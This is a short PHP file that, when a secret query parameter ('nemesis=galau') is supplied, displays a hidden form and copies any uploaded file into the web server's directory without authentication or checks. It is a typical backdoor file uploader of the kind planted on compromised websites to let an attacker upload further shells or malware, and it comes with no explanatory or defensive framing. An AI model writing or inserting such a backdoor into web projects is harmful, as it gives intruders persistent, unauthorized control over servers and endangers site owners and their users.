<?php 
if ($_GET['nemesis'] == 'galau'){
    echo '<pre><p>Nemesis<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
}
?>
